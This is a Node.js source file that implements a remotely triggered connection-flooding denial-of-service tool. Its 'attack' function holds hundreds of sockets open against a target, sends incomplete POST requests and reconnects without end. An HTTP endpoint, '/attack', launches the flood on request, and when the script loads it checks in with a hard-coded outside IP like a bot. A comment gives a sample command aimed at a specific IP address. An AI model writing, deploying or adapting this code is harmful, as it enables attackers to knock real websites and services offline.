/**
 * Created with JetBrains WebStorm.
 * User: kaven276
 * Date: 13-5-22
 * Time: 下午3:08
 */

/**
 * Created with JetBrains WebStorm.
 * User: kaven276
 * Date: 13-5-13
 * Time: 下午3:15
 * Transfer-Encoding:chunked\r\n
 * Content-Length:10000\r\n
 */

var net = require('net')
  , Socket = net.Socket
  , ReqLine = "POST ${path} HTTP/1.1\r\nHOST:${host}\r\nContent-Length:10000\r\n\r\n"
//, ReqLine = "GET ${path}/ HTTP/1.1\r\nHOST:${host}\r\n"
  ;

var c = net.connect(9012, '60.29.143.50', function(){
  console.log('connect to ');
  c.write('connect from appfog app idle-connect');
});
c.on('error', function(){
});

function attack(port, host, concurrency, mode, path){
  var reqLine = ReqLine.replace('${path}', path || '/').replace('${host}', host)
    , runnings = 0
    , no = 0
    , me = this
    ;

  function action(){
    var socket = new Socket()
      , id = ++no
      ;

    socket.on('connect', function(){

      if (mode) {
        socket.write(reqLine);
      }

      // socket.setTimeout(5000);
      socket.on('timeout', function(){
        console.log("NO.%d idle timeout", id);
        socket.destroy();
      });

      socket.on('end', function(data){
        socket.destroy();
        console.log("NO.%d on.end", id);
        runnings--;
        action();
      });

    });

    socket.on('error', function(err){
      console.log("NO.%d", id, err);
      socket.destroy();
      if (err.syscall === "connect" || err.syscall === "getaddrinfo") {
        runnings--;
        action();
      } else {
      }
    });

    runnings++;
    socket.connect(port, host);
    console.log('NO.%d try connect', id, runnings);
  }

  for (var i = 0; i < concurrency; i++) {
    action();
  }
}

var http = require('http')
  , url = require('url')
  ;

http.createServer(function(req, res){
  res.writeHead(200, {'Content-Type' : 'text/html'});
  var u = url.parse(req.url, true);
  console.log(1, u);
  if (u.pathname === '/attack') {
    var p = u.query;
    attack(parseInt(p.port), p.host, parseInt(p.amount));
  }
  res.end('Hello World, it works!');


}).listen(process.env.VMC_APP_PORT || 1337);

// 测速网站
// http://localhost:1337/attack?host=61.181.69.130&port=80&amount=680